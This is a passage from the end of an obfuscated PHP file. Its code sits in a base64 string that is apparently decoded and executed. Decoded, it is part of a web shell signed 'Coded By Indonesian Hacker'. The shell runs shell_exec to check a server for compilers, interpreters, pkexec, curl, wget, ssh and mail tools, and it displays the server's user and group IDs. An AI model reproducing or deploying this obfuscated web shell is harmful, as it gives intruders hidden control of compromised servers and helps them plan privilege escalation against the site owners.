ucycgPT4gaW5pX2dldCgnZGlzYWJsZV9mdW5jdGlvbnMnKSwKICAgICAgICAgICAgICAgICAgICAnR0NDJyA9PiBmdW5jdGlvbl9leGlzdHMoJ3NoZWxsX2V4ZWMnKSAmJiBzaGVsbF9leGVjKCdnY2MgLS12ZXJzaW9uJykgPyAnT24nIDogJ09mZicsCiAgICAgICAgICAgICAgICAgICAgJ1BlcmwnID0+IGZ1bmN0aW9uX2V4aXN0cygnc2hlbGxfZXhlYycpICYmIHNoZWxsX2V4ZWMoJ3BlcmwgLS12ZXJzaW9uJykgPyAnT24nIDogJ09mZicsCiAgICAgICAgICAgICAgICAgICAgJ1B5dGhvbiBWZXJzaW9uJyA9PiAoJHB5dGhvblZlcnNpb24gPSBzaGVsbF9leGVjKCdweXRob24gLS12ZXJzaW9uJykpID8gJ09uICgnIC4gJHB5dGhvblZlcnNpb24gLiAnKScgOiAnT2ZmJywKICAgICAgICAgICAgICAgICAgICAnUEtFWEVDIFZlcnNpb24nID0+ICgkcGtleGVjVmVyc2lvbiA9IHNoZWxsX2V4ZWMoJ3BrZXhlYyAtLXZlcnNpb24nKSkgPyAnT24gKCcgLiAkcGtleGVjVmVyc2lvbiAuICcpJyA6ICdPZmYnLAogICAgICAgICAgICAgICAgICAgICdDdXJsJyA9PiBmdW5jdGlvbl9leGlzdHMoJ3NoZWxsX2V4ZWMnKSAmJiBzaGVsbF9leGVjKCdjdXJsIC0tdmVyc2lvbicpID8gJ09uJyA6ICdPZmYnLAogICAgICAgICAgICAgICAgICAgICdXZ2V0JyA9PiBmdW5jdGlvbl9leGlzdHMoJ3NoZWxsX2V4ZWMnKSAmJiBzaGVsbF9leGVjKCd3Z2V0IC0tdmVyc2lvbicpID8gJ09uJyA6ICdPZmYnLAogICAgICAgICAgICAgICAgICAgICdNeXNxbCcgPT4gZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykgJiYgc2hlbGxfZXhlYygnbXlzcWwgLS12ZXJzaW9uJykgPyAnT24nIDogJ09mZicsCiAgICAgICAgICAgICAgICAgICAgJ0Z0cCcgPT4gZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykgJiYgc2hlbGxfZXhlYygnZnRwIC0tdmVyc2lvbicpID8gJ09uJyA6ICdPZmYnLAogICAgICAgICAgICAgICAgICAgICdTc2gnID0+IGZ1bmN0aW9uX2V4aXN0cygnc2hlbGxfZXhlYycpICYmIHNoZWxsX2V4ZWMoJ3NzaCAtLXZlcnNpb24nKSA/ICdPbicgOiAnT2ZmJywKICAgICAgICAgICAgICAgICAgICAnTWFpbCcgPT4gZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykgJiYgc2hlbGxfZXhlYygnbWFpbCAtLXZlcnNpb24nKSA/ICdPbicgOiAnT2ZmJywKICAgICAgICAgICAgICAgICAgICAnY3JvbicgPT4gZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykgJiYgc2hlbGxfZXhlYygnY3JvbiAtLXZlcnNpb24nKSA/ICdPbicgOiAnT2ZmJywKICAgICAgICAgICAgICAgICAgICAnU2VuZE1haWwnID0+IGZ1bmN0aW9uX2V4aXN0cygnc2hlbGxfZXhlYycpICYmIHNoZWxsX2V4ZWMoJ3NlbmRtYWlsIC0tdmVyc2lvbicpID8gJ09uJyA6ICdPZmYnLAogICAgICAgICAgICAgICAgXTsKICAgICAgICAgICAgICAgID8+CgogICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0iZmVhdHVyZS1zZWxlY3QiPlNlbGVjdCBGZWF0dXJlOjwvbGFiZWw+CiAgICAgICAgICAgICAgICA8c2VsZWN0IGlkPSJmZWF0dXJlLXNlbGVjdCI+CiAgICAgICAgICAgICAgICAgICAgPD9waHAgZm9yZWFjaCAoJGZlYXR1cmVzIGFzICRmZWF0dXJlID0+ICRzdGF0dXMpIDogPz4KICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iPD9waHAgZWNobyAkZmVhdHVyZTsgPz4iPjw/cGhwIGVjaG8gJGZlYXR1cmUgLiAnOiAnIC4gJHN0YXR1czsgPz48L29wdGlvbj4KICAgICAgICAgICAgICAgICAgICA8P3BocCBlbmRmb3JlYWNoOyA/PgogICAgICAgICAgICAgICAgPC9zZWxlY3Q+CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgPC9kaXY+CgogICAgICAgIDxkaXYgY2xhc3M9ImluZm8tY29udGFpbmVyIj4KICAgICAgICAgICAgPGgyPlVzZXIgSW5mbzwvaDI+CiAgICAgICAgICAgIDx1bCBjbGFzcz0iaW5mby1saXN0Ij4KICAgICAgICAgICAgICAgIDxsaT5Vc2VybmFtZTogPD9waHAgZWNobyBAZ2V0X2N1cnJlbnRfdXNlcigpOyA/PjwvbGk+CiAgICAgICAgICAgICAgICA8bGk+VXNlciBJRDogPD9waHAgZWNobyBAZ2V0bXl1aWQoKTsgPz48L2xpPgogICAgICAgICAgICAgICAgPGxpPkdyb3VwIElEOiA8P3BocCBlY2hvIEBnZXRteWdpZCgpOyA/PjwvbGk+CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KPC9kaXY+CiAgICA8c2NyaXB0PgogICAgICAgIGZ1bmN0aW9uIHRvZ2dsZU9wdGlvbnNNZW51KCkgewogICAgICAgICAgICB2YXIgb3B0aW9uc01lbnUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3B0aW9uc01lbnUnKTsKICAgICAgICAgICAgb3B0aW9uc01lbnUuY2xhc3NMaXN0LnRvZ2dsZSgnc2hvdycpOwogICAgICAgIH0KICAgICAgICAKICAgICAgICBmdW5jdGlvbiB0b2dnbGVTaWRlYmFyKCkgewogICAgICAgICAgICB2YXIgc2lkZWJhciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaWRlYmFyJyk7CiAgICAgICAgICAgIHNpZGViYXIuY2xhc3NMaXN0LnRvZ2dsZSgnb3BlbicpOwogICAgICAgIH0KICAgIDwvc2NyaXB0Pgo8L2Rpdj4KPGRpdiBjbGFzcz0iZm9vdGVyIj4KICAgIDxwPiZjb3B5OyA8P3BocCBlY2hvIGRhdGUoIlkiKTsgPz5Db2RlZCBCeTwvYT4gSW5kb25lc2lhbiBIYWNrZXIuPC9wPgo8L2Rpdj4KPC9ib2R5Pgo8L2h0bWw+Cg==")); ?>
